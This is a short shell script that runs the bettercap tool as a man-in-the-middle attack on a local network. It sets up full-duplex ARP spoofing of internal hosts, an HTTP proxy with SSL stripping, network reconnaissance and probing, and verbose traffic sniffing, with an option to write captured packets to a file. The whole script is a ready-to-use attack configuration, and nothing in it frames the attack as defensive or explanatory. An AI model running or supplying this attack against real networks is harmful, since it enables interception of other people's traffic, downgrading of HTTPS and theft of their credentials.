# bettercap -iface eth0 -eval "set http.proxy.sslstrip true; set net.sniff.verbose true; set net.sniff.output /root/mitm.pcap; set arp.spoof.fullduplex true; set arp.spoof.internal true; net.recon on; net.probe on; arp.spoof on; http.proxy on; net.sniff on"

ARGS=(
    "set http.proxy.sslstrip true"
    "set net.sniff.verbose true"
    # "set net.sniff.output /root/mitm.pcap"
    "set arp.spoof.fullduplex true"
    "set arp.spoof.internal true"
    "net.recon on"
    "net.probe on"
    "arp.spoof on"
    "http.proxy on"
    "net.sniff on"
)

echo $ARGS

bettercap -eval "$(
    IFS='; '
    echo "${ARGS[*]}"
)"
